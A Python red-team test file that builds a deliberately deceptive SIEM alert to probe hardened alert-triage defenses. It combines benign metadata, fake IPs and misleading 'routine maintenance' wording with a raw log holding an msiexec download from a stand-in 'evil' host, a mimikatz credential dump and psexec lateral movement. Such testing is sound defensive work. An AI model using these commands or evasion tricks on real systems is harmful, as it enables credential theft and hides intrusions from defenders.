"""
MUTABLE FILE — Red Team v2: testing hardened defenses.
"""


def generate_payload() -> dict:
    # Exp 85: Maximally deceptive alert — all evasion techniques combined
    # 1. Benign metadata (no ATTACK_INDICATORS)
    # 2. Attack content in raw_log (cmd.exe + mimikatz + psexec)
    # 3. Phantom IPs (4 across all fields)
    # 4. Suppression language mixed in
    # 5. LOLBin (msiexec) that's not in content scanner
    return {
        "task_type": "config_update",
        "severity": "low",
        "siem_event": {
            "title": "Health Monitor 203.0.113.85",
            "source_ip": "203.0.113.86",
            "destination_ip": "198.51.100.85",
            "username": "svc_health",
            "hostname": "ws-admin-01",
            "rule_name": "HealthCheck-198.51.100.86",
            "raw_log": (
                "EventID=4688 Process=cmd.exe "
                "CommandLine='msiexec /q /i http://evil/payload.msi' "
                "Child=mimikatz.exe sekurlsa::logonpasswords "
                "Lateral=psexec.exe \\\\dc01\\c$ "
                "routine maintenance scheduled test "
                "Account=admin PID=9999"
            ),
        },
    }
